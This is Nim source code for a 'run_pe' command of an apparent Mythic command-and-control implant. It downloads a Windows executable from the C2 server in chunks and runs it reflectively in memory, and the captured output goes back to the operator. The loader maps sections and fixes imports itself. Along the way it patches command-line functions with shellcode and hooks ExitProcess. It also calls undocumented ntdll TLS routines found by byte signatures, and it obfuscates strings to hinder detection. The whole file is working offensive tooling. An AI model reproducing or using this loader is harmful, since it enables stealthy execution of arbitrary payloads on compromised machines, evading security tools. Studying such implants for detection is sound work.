import winim/lean
import base64
import strutils
import json
import ../utils/[strenc, m_responses, debug, ptr_math]

proc patchMemory(targetAddr: pointer, data: seq[byte]) =
  ## Patch memory at targetAddr with data, handling protection
  var oldProtect: DWORD
  discard VirtualProtect(targetAddr, cast[SIZE_T](len(data)), PAGE_EXECUTE_READWRITE, cast[PDWORD](addr oldProtect))
  copyMem(targetAddr, unsafeAddr data[0], len(data))
  discard VirtualProtect(targetAddr, cast[SIZE_T](len(data)), oldProtect, cast[PDWORD](addr oldProtect))

proc patchArgFunctionMemory(funcAddr: pointer, pNewCommandLine: pointer) =
  ## Patch a function to return a custom command line string
  ## Creates shellcode: movabs rax, <addr>; ret
  when defined(amd64):
    var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
  else:
    var shellcode: seq[byte] = @[byte(0xb8)] # mov eax, new_cmd
  
  # Add command line address to shellcode
  for t in cast[array[sizeof(pointer), byte]](pNewCommandLine):
    shellcode.add(t)
  
  shellcode.add(byte(0xc3)) # ret
  patchMemory(funcAddr, shellcode)

const PEB_OFFSET = when defined(amd64): 0x60 else: 0x30
const CHUNK_SIZE = 512000  # 512KB chunks

type
  RunPeArgs = object
    uuid: string
    program_name: string
    args: string
    full_tls: bool

type
  BASE_RELOCATION_ENTRY* {.bycopy.} = object
    Offset* {.bitsize: 12.}: WORD
    Type* {.bitsize: 4.}: WORD

  LdrpReleaseTlsEntryFn = proc(entry: ptr LDR_DATA_TABLE_ENTRY, unk: pointer) {.cdecl.}
  LdrpHandleTlsDataFn = proc(entry: ptr LDR_DATA_TABLE_ENTRY) {.cdecl.}

const
  RELOC_32BIT_FIELD* = 3
  LDRP_RELEASE_TLS_ENTRY_SIGNATURE_BYTES = [byte 0x83, 0xE1, 0x07, 0x48, 0xC1, 0xEA, 0x03]
  LDRP_HANDLE_TLS_DATA_SIGNATURE_BYTES = [byte 0xBA, 0x23, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC9, 0xFF]

proc GetPPEB(p: culong): PPEB {.header: """#include <windows.h>
           #include <winnt.h>""", importc: "__readgsqword".}

proc getNtHdrs*(peBuffer: ptr BYTE): ptr BYTE =
  if peBuffer == nil:
    return nil
  let idh = cast[ptr IMAGE_DOS_HEADER](peBuffer)
  if idh.e_magic != IMAGE_DOS_SIGNATURE:
    return nil
  let kMaxOffset: LONG = 1024
  let peOffset: LONG = idh.e_lfanew
  if peOffset > kMaxOffset:
    return nil
  let inh = cast[ptr IMAGE_NT_HEADERS32](cast[ptr BYTE](peBuffer) + peOffset)
  if inh.Signature != IMAGE_NT_SIGNATURE:
    return nil
  return cast[ptr BYTE](inh)

proc getPeDir*(peBuffer: PVOID; dirId: csize_t): ptr IMAGE_DATA_DIRECTORY =
  if dirId >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES:
    return nil
  let ntHeaders = getNtHdrs(cast[ptr BYTE](peBuffer))
  if ntHeaders == nil:
    return nil
  let ntHeader = cast[ptr IMAGE_NT_HEADERS](ntHeaders)
  let peDir = addr(ntHeader.OptionalHeader.DataDirectory[dirId])
  if peDir.VirtualAddress == 0:
    return nil
  return peDir

proc applyReloc*(newBase: ULONGLONG; oldBase: ULONGLONG; modulePtr: PVOID; moduleSize: SIZE_T): bool =
  debug "    [!] Applying Reloc"
  let relocDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC)
  if relocDir == nil:
    return false
  let maxSize = csize_t(relocDir.Size)
  let relocAddr = csize_t(relocDir.VirtualAddress)
  var reloc: ptr IMAGE_BASE_RELOCATION = nil
  var parsedSize: csize_t = 0
  
  while parsedSize < maxSize:
    reloc = cast[ptr IMAGE_BASE_RELOCATION](csize_t(relocAddr) + csize_t(parsedSize) + cast[csize_t](modulePtr))
    if reloc.VirtualAddress == 0 or reloc.SizeOfBlock == 0:
      break
    
    let entriesNum = csize_t((reloc.SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))) div csize_t(sizeof(BASE_RELOCATION_ENTRY))
    let page = csize_t(reloc.VirtualAddress)
    var entry = cast[ptr BASE_RELOCATION_ENTRY](cast[csize_t](reloc) + csize_t(sizeof(IMAGE_BASE_RELOCATION)))
    
    for i in 0..<entriesNum:
      let offset = entry.Offset
      let entryType = entry.Type
      let relocField = page + offset
      
      if entry == nil or entryType == 0:
        break
      if entryType != RELOC_32BIT_FIELD:
        debug "    [!] Not supported relocations format at " & $i & " " & $entryType
        return false
      if csize_t(relocField) >= csize_t(moduleSize):
        debug "    [-] Out of Bound Field: " & $relocField
        return false
      
      debug "    [V] Apply Reloc Field at " & $cast[int](relocField)
      
      let relocateAddr = cast[ptr csize_t](cast[csize_t](modulePtr) + csize_t(relocField))
      relocateAddr[] = (relocateAddr[] - csize_t(oldBase) + csize_t(newBase))
      entry = cast[ptr BASE_RELOCATION_ENTRY](cast[csize_t](entry) + csize_t(sizeof(BASE_RELOCATION_ENTRY)))
    
    inc(parsedSize, reloc.SizeOfBlock)
  
  return parsedSize != 0

proc OriginalFirstThunk*(self: ptr IMAGE_IMPORT_DESCRIPTOR): DWORD {.inline.} = 
  self.union1.OriginalFirstThunk

proc fixIAT*(modulePtr: PVOID; exeArgs: string): bool =
  debug "[+] Fix Import Address Table"
  let importsDir = getPeDir(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT)
  if importsDir == nil:
    return false
  let maxSize = cast[csize_t](importsDir.Size)
  let impAddr = cast[csize_t](importsDir.VirtualAddress)
  var libDesc: ptr IMAGE_IMPORT_DESCRIPTOR
  var parsedSize: csize_t = 0
  
  # Prepare command line string if args provided
  var exeArgsPassed = false
  var commandStr = ""
  var persistentCmdW: pointer = nil
  var persistentCmdA: pointer = nil
  
  if exeArgs.len > 0:
    # Construct full command line: "program.exe args"
    commandStr = exeArgs
    exeArgsPassed = true
    debug "[+] Will patch command line functions with args: " & commandStr
    
    # Allocate persistent memory for wide string (UTF-16)
    # Use Windows API to convert and allocate
    let wideLen = MultiByteToWideChar(CP_UTF8, 0, commandStr.cstring, -1, nil, 0)
    let wideBytesNeeded = wideLen * 2  # Each wide char is 2 bytes
    persistentCmdW = VirtualAlloc(nil, cast[SIZE_T](wideBytesNeeded), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if persistentCmdW != nil:
      discard MultiByteToWideChar(CP_UTF8, 0, commandStr.cstring, -1, cast[LPWSTR](persistentCmdW), wideLen)
    
    # Allocate persistent memory for ANSI string  
    let ansiBytesNeeded = commandStr.len + 1  
    persistentCmdA = VirtualAlloc(nil, cast[SIZE_T](ansiBytesNeeded), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
    if persistentCmdA != nil:
      for i in 0..commandStr.len:  # Include null terminator
        let dstPtr = cast[ptr UncheckedArray[char]](persistentCmdA)
        if i < commandStr.len:
          dstPtr[i] = commandStr[i]
        else:
          dstPtr[i] = '\0'
  
  while parsedSize < maxSize:
    libDesc = cast[ptr IMAGE_IMPORT_DESCRIPTOR](impAddr + parsedSize + cast[uint64](modulePtr))
    if (libDesc.OriginalFirstThunk == 0) and (libDesc.FirstThunk == 0):
      break
    
    let libname = cast[LPSTR](cast[ULONGLONG](modulePtr) + libDesc.Name)
    debug "    [+] Import DLL: " & $libname
    var callVia = csize_t(libDesc.FirstThunk)
    var thunkAddr = csize_t(libDesc.OriginalFirstThunk)
    if thunkAddr == 0:
      thunkAddr = csize_t(libDesc.FirstThunk)
    
    var offsetField: csize_t = 0
    var offsetThunk: csize_t = 0
    let hmodule = LoadLibraryA(libname)
    
    # Patch _wcmdln and _acmdln if present and args provided
    if exeArgsPassed and persistentCmdW != nil and persistentCmdA != nil:
      let wcmdlenaddr = GetProcAddress(hmodule, obf("_wcmdln"))
      if wcmdlenaddr != nil:
        debug "        [>] Found _wcmdln -> patching with exeArgs"
        # Get pointer bytes from persistent memory
        var byteSeq: seq[byte]
        let ptrVal = cast[uint](persistentCmdW)
        for b in cast[array[sizeof(pointer), byte]](ptrVal):
          byteSeq.add(b)
        patchMemory(cast[pointer](wcmdlenaddr), byteSeq)
      
      let acmdlenaddr = GetProcAddress(hmodule, obf("_acmdln"))
      if acmdlenaddr != nil:
        debug "        [>] Found _acmdln -> patching with exeArgs"
        # Get pointer bytes from persistent memory
        var byteSeq: seq[byte]
        let ptrVal = cast[uint](persistentCmdA)
        for b in cast[array[sizeof(pointer), byte]](ptrVal):
          byteSeq.add(b)
        patchMemory(cast[pointer](acmdlenaddr), byteSeq)
    
    while true:
      let fieldThunk = cast[PIMAGE_THUNK_DATA](cast[csize_t](modulePtr) + offsetField + callVia)
      let orginThunk = cast[PIMAGE_THUNK_DATA](cast[csize_t](modulePtr) + offsetThunk + thunkAddr)
      
      var boolvar = false
      if ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG32) != 0):
        boolvar = true
      elif ((orginThunk.u1.Ordinal and IMAGE_ORDINAL_FLAG64) != 0):
        boolvar = true
      
      if boolvar:
        let libaddr = cast[csize_t](GetProcAddress(LoadLibraryA(libname), cast[LPSTR](orginThunk.u1.Ordinal and 0xFFFF)))
        fieldThunk.u1.Function = ULONGLONG(libaddr)
        debug "        [V] API ord: " & $(orginThunk.u1.Ordinal and 0xFFFF)
      
      if fieldThunk.u1.Function == 0:
        break
      
      if fieldThunk.u1.Function == orginThunk.u1.Function:
        let nameData = cast[PIMAGE_IMPORT_BY_NAME](orginThunk.u1.AddressOfData)
        let byname = cast[PIMAGE_IMPORT_BY_NAME](cast[ULONGLONG](modulePtr) + cast[DWORD](nameData))
        let funcName = cast[LPCSTR](addr byname.Name)
        let libaddr = cast[csize_t](GetProcAddress(hmodule, funcName))
        debug "        [V] API: " & $funcName
        fieldThunk.u1.Function = ULONGLONG(libaddr)
        
        # Patch command line functions if args provided
        if exeArgsPassed and persistentCmdW != nil and persistentCmdA != nil:
          let funcNameStr = $funcName
          if funcNameStr == obf("GetCommandLineW"):
            debug "           [>] Patching GetCommandLineW to pass exeArgs"
            # Use persistent memory pointer
            patchArgFunctionMemory(cast[pointer](libaddr), persistentCmdW)
          elif funcNameStr == obf("GetCommandLineA"):
            debug "           [>] Patching GetCommandLineA to pass exeArgs"
            # Use persistent memory pointer
            patchArgFunctionMemory(cast[pointer](libaddr), persistentCmdA)
          elif funcNameStr == obf("CommandLineToArgvW"):
            debug "           [>] Found CommandLineToArgvW - will use patched GetCommandLineW"
            # CommandLineToArgvW calls GetCommandLineW internally, so our patch will work
        
        # When PE calls ExitProcess, redirect to ExitThread to only kill the PE thread
        let funcNameStr = $funcName
        if funcNameStr == obf("ExitProcess"):
          debug "           [>] Hooking ExitProcess -> redirecting to ExitThread"
          let exitThreadAddr = GetProcAddress(hmodule, obf("ExitThread"))
          if exitThreadAddr != nil:
            fieldThunk.u1.Function = cast[ULONGLONG](exitThreadAddr)
          else:
            debug "           [-] WARNING: Failed to get ExitThread address"
      
      inc(offsetField, csize_t(sizeof(IMAGE_THUNK_DATA)))
      inc(offsetThunk, csize_t(sizeof(IMAGE_THUNK_DATA)))
    
    inc(parsedSize, csize_t(sizeof(IMAGE_IMPORT_DESCRIPTOR)))
  
  return true

proc getModuleSectionByName(baseAddr: HMODULE; sectionName: array[0..7, byte]): (ptr BYTE, DWORD) =
  let ntHeaders = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(cast[ptr BYTE](baseAddr)))
  if ntHeaders == nil:
    return (nil, 0)
  
  var sectionHeaders = cast[ptr IMAGE_SECTION_HEADER](ntHeaders + 1)
  for i in 0..<cast[int](ntHeaders.FileHeader.NumberOfSections):
    let section = sectionHeaders + (i * int(sizeof(IMAGE_SECTION_HEADER)))
    if section.Name == sectionName:
      let sectionAddr = cast[ptr BYTE](baseAddr + section.VirtualAddress)
      return (sectionAddr, section.SizeOfRawData)
  
  return (nil, 0)

proc findPattern(data: ptr uint8; dataLen: int; pattern: openArray[uint8]): ptr uint8 =
  let patternLen = pattern.len
  for i in 0..(dataLen - patternLen):
    var matched = true
    for j in 0..<patternLen:
      if (data + i + j)[] != pattern[j]:
        matched = false
        break
    if matched:
      return data + i
  return nil

proc fullPatchTLS(newBaseAddress: ptr byte; moduleSize: int; entrypoint: pointer): bool =
  let currentModule = GetModuleHandleA(nil)
  let peb = GetPPEB(PEB_OFFSET)
  let ldrData = peb.Ldr
  let moduleListHead = cast[ptr LIST_ENTRY](addr ldrData.InMemoryOrderModuleList)
  var next = moduleListHead.Flink
  var calledRelease, calledHandle = false
  
  while next != moduleListHead:
    let moduleInfo = cast[ptr LDR_DATA_TABLE_ENTRY](cast[uint](next) - uint(sizeof(pointer)))
    if moduleInfo.DllBase != cast[PVOID](currentModule):
      next = next.Flink
      continue
    
    moduleInfo.DllBase = newBaseAddress
    moduleInfo.Reserved3[0] = cast[pointer](entrypoint)
    moduleInfo.Reserved3[1] = cast[pointer](moduleSize)
    
    let ntdllAddr = GetModuleHandleA(obf("ntdll.dll"))
    let (ntdllText, ntdllTextLen) = getModuleSectionByName(ntdllAddr, [byte 46, 116, 101, 120, 116, 0, 0, 0])
    if ntdllText == nil:
      break
    
    debug "\t[+] Found NTDLL's .text section..."
    
    # Search for LDRP_RELEASE_TLS_ENTRY_SIGNATURE_BYTES pattern
    let ldrpReleaseTlsEntryPtr = findPattern(cast[ptr uint8](ntdllText), ntdllTextLen, LDRP_RELEASE_TLS_ENTRY_SIGNATURE_BYTES)
    if ldrpReleaseTlsEntryPtr != nil:
      var loc = ldrpReleaseTlsEntryPtr
      while (loc - 1)[] != 0xcc or (loc - 2)[] != 0xcc:
        loc = loc - 1
      let LdrpReleaseTlsEntry = cast[LdrpReleaseTlsEntryFn](loc)
      debug "\t[+] Found ReleaseTlsEntry, calling..."
      LdrpReleaseTlsEntry(moduleInfo, nil)
      calledRelease = true
    
    # Search for LDRP_HANDLE_TLS_DATA_SIGNATURE_BYTES pattern
    let ldrpHandleTlsDataPtr = findPattern(cast[ptr uint8](ntdllText), ntdllTextLen, LDRP_HANDLE_TLS_DATA_SIGNATURE_BYTES)
    if ldrpHandleTlsDataPtr != nil:
      var loc = ldrpHandleTlsDataPtr
      while (loc - 1)[] != 0xcc or (loc - 2)[] != 0xcc:
        loc = loc - 1
      let LdrpHandleTlsData = cast[LdrpHandleTlsDataFn](loc)
      debug "\t[+] Found HandleTlsData, calling..."
      LdrpHandleTlsData(moduleInfo)
      calledHandle = true
  
  return calledRelease and calledHandle

proc execTLSCallbacks*(baseAddress: PVOID; tlsDir: ptr IMAGE_DATA_DIRECTORY; fullTls: bool) =
  let tls = cast[ptr IMAGE_TLS_DIRECTORY](cast[ULONGLONG](baseAddress) + tlsDir.VirtualAddress)
  var tlsCallback = cast[ptr ULONGLONG](tls.AddressOfCallBacks)
  
  while tlsCallback[] != 0:
    debug "    [+] TLS Callback: " & $cast[int](tlsCallback[])
    let callback = cast[proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): void {.cdecl.}](tlsCallback[])
    try:
      callback(cast[HINSTANCE](baseAddress), DLL_PROCESS_ATTACH, nil)
    except:
      debug "[-] TLS Callback failed"
      discard
    tlsCallback = tlsCallback + 1

proc runPE*(peBytes: seq[byte]; exeArgs: string = ""; fullTls: bool = false): string =
  try:
    debug "[DEBUG] runPE called with exeArgs: '" & exeArgs & "' (len: " & $exeArgs.len & ")"
    
    if peBytes.len == 0:
      return "Error: PE bytes are empty"
    
    var shellcodePtr = cast[ptr BYTE](unsafeAddr peBytes[0])
    let ntHeader = cast[ptr IMAGE_NT_HEADERS](getNtHdrs(shellcodePtr))
    
    if ntHeader == nil:
      return "Error: File isn't a valid PE file"
    
    debug "[+] Exe File Prefer Image Base"
    debug "Size: " & $ntHeader.OptionalHeader.SizeOfImage
    
    let relocDir = getPeDir(shellcodePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC)
    let preferAddr = cast[LPVOID](ntHeader.OptionalHeader.ImageBase)
    
    var pImageBase = cast[ptr BYTE](VirtualAlloc(
      preferAddr,
      ntHeader.OptionalHeader.SizeOfImage,
      MEM_COMMIT or MEM_RESERVE,
      PAGE_EXECUTE_READWRITE
    ))
    
    if pImageBase == nil and relocDir == nil:
      return "Error: Failed to allocate image base at preferred address and no relocations available"
    
    if pImageBase == nil and relocDir != nil:
      debug "[+] Try to Allocate Memory for New Image Base"
      pImageBase = cast[ptr BYTE](VirtualAlloc(
        nil,
        ntHeader.OptionalHeader.SizeOfImage,
        MEM_COMMIT or MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
      ))
      if pImageBase == nil:
        return "Error: Failed to allocate memory for image base"
    
    # Update image base
    ntHeader.OptionalHeader.ImageBase = cast[ULONGLONG](pImageBase)
    
    # Copy headers
    copymem(pImageBase, shellcodePtr, ntHeader.OptionalHeader.SizeOfHeaders)
    
    debug "[+] Mapping Section ..."
    # Map sections
    let sectionHeaderArr = cast[ptr IMAGE_SECTION_HEADER](cast[csize_t](ntHeader) + csize_t(sizeof(IMAGE_NT_HEADERS)))
    for i in 0..<cast[int](ntHeader.FileHeader.NumberOfSections):
      let section = sectionHeaderArr + i
      let dest = cast[LPVOID](pImageBase + section.VirtualAddress)
      let source = cast[LPVOID](shellcodePtr + section.PointerToRawData)
      copymem(dest, source, cast[DWORD](section.SizeOfRawData))
    
    # Fix IAT
    if not fixIAT(pImageBase, exeArgs):
      return "Error: Failed to fix Import Address Table"
    
    # Handle TLS callbacks
    let tlsDir = getPeDir(pImageBase, IMAGE_DIRECTORY_ENTRY_TLS)
    if tlsDir != nil:
      if fullTls:
        debug "[+] TLS Directory found, attempting to fully patch TLS"
        if not fullPatchTLS(pImageBase, ntHeader.OptionalHeader.SizeOfImage, pImageBase + ntHeader.OptionalHeader.AddressOfEntryPoint):
          debug "[-] WARNING: Full TLS patch failed, falling back to running callbacks once"
          execTLSCallbacks(pImageBase, tlsDir, fullTls)
      else:
        debug "[+] TLS Directory found, running callbacks once"
        execTLSCallbacks(pImageBase, tlsDir, fullTls)
    else:
      debug "[-] No TLS Directory found"
    
    # Apply relocations if needed
    if pImageBase != preferAddr:
      if not applyReloc(cast[ULONGLONG](pImageBase), cast[ULONGLONG](preferAddr), pImageBase, ntHeader.OptionalHeader.SizeOfImage):
        return "Error: Failed to apply relocations"
      debug "[+] Relocation Fixed."
    
    debug "Run Exe Module:"
    
    # Create pipes to capture stdout/stderr
    var stdoutRead, stdoutWrite: HANDLE
    var stderrRead, stderrWrite: HANDLE
    var sa: SECURITY_ATTRIBUTES
    sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
    sa.bInheritHandle = 1
    sa.lpSecurityDescriptor = nil
    
    if CreatePipe(addr stdoutRead, addr stdoutWrite, addr sa, 0) == 0:
      debug "[-] Failed to create stdout pipe"
    if CreatePipe(addr stderrRead, addr stderrWrite, addr sa, 0) == 0:
      debug "[-] Failed to create stderr pipe"
    
    # Save original handles
    let originalStdout = GetStdHandle(STD_OUTPUT_HANDLE)
    let originalStderr = GetStdHandle(STD_ERROR_HANDLE)
    
    # Redirect stdout/stderr to our pipes
    SetStdHandle(STD_OUTPUT_HANDLE, stdoutWrite)
    SetStdHandle(STD_ERROR_HANDLE, stderrWrite)
    
    # Execute entry point
    let retAddr = cast[HANDLE](pImageBase) + cast[HANDLE](ntHeader.OptionalHeader.AddressOfEntryPoint)
    let thread = CreateThread(nil, cast[SIZE_T](0), cast[LPTHREAD_START_ROUTINE](retAddr), nil, 0, nil)
    
    if thread == 0:
      # Restore handles
      SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
      SetStdHandle(STD_ERROR_HANDLE, originalStderr)
      CloseHandle(stdoutRead)
      CloseHandle(stdoutWrite)
      CloseHandle(stderrRead)
      CloseHandle(stderrWrite)
      return "Error: Failed to create execution thread"
    
    # Wait for PE to complete
    WaitForSingleObject(thread, INFINITE)
    CloseHandle(thread)
    
    # Close write ends so we can read
    CloseHandle(stdoutWrite)
    CloseHandle(stderrWrite)
    
    # Restore original handles
    SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
    SetStdHandle(STD_ERROR_HANDLE, originalStderr)
    
    # Read captured output
    var capturedOutput = ""
    var buffer: array[4096, char]
    var bytesRead: DWORD
    
    # Read stdout
    while ReadFile(stdoutRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
      for i in 0..<bytesRead:
        capturedOutput.add(buffer[i])
    
    # Read stderr
    while ReadFile(stderrRead, addr buffer[0], 4096, addr bytesRead, nil) != 0 and bytesRead > 0:
      for i in 0..<bytesRead:
        capturedOutput.add(buffer[i])
    
    CloseHandle(stdoutRead)
    CloseHandle(stderrRead)
    
    debug "[DEBUG] RunPE complete"
    
    # Free allocated memory
    if pImageBase != nil:
      debug "[+] Freeing PE memory"
      discard VirtualFree(pImageBase, 0, MEM_RELEASE)
    
    if capturedOutput.len > 0:
      return capturedOutput
    else:
      return "PE executed successfully (no output captured)"
  
  except Exception as e:
    return "Error: " & e.msg

proc run_pe*(taskId: string, params: JsonNode): JsonNode =
  ## Execute a PE file in memory using RunPE technique
  ## First response - request the file from Mythic
  when not defined(windows):
    return mythicError(taskId, obf("run_pe is only supported on Windows"))
  else:
    try:
      let args = to(params, RunPeArgs)
      
      debug "[DEBUG] run_pe: Requesting PE file"
      debug "[DEBUG] UUID for download: " & args.uuid
      
      # Step 1: Request the PE file from Mythic
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("file_id"): args.uuid,
          obf("chunk_num"): 1,
          obf("chunk_size"): CHUNK_SIZE,
          obf("full_path"): ""
        }
      }
    except Exception as e:
      return mythicError(taskId, obf("Failed to parse run_pe parameters: ") & e.msg)

proc processRunPeChunk*(taskId: string, params: JsonNode, chunkData: string,
                        totalChunks: int, currentChunk: int,
                        fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the PE file being downloaded
  when defined(windows):
    try:
      let args = to(params, RunPeArgs)
      
      debug "[DEBUG] run_pe chunk " & $currentChunk & "/" & $totalChunks
      
      # Decode and append chunk
      let decodedChunk = decode(chunkData)
      fileData.add(cast[seq[byte]](decodedChunk))
      
      # If more chunks needed, request next chunk
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("chunk_size"): CHUNK_SIZE,
            obf("full_path"): ""
          }
        }
      
      # All chunks received, execute PE
      debug "[DEBUG] run_pe: All " & $totalChunks & " chunks received, total size: " & $fileData.len & " bytes"
      
      # Construct full command line: "program.exe args"
      var fullCommandLine = args.program_name
      if args.args.len > 0:
        fullCommandLine = fullCommandLine & " " & args.args
      
      debug "[DEBUG] run_pe: Executing PE with command line: '" & fullCommandLine & "'"
      
      let output = runPE(fileData, fullCommandLine, args.full_tls)
      
      if output.startsWith("Error:"):
        return mythicError(taskId, output)
      else:
        return mythicSuccess(taskId, output)
      
    except Exception as e:
      return mythicError(taskId, obf("run_pe error: ") & e.msg)
  else:
    return mythicError(taskId, obf("run_pe command is only available on Windows"))
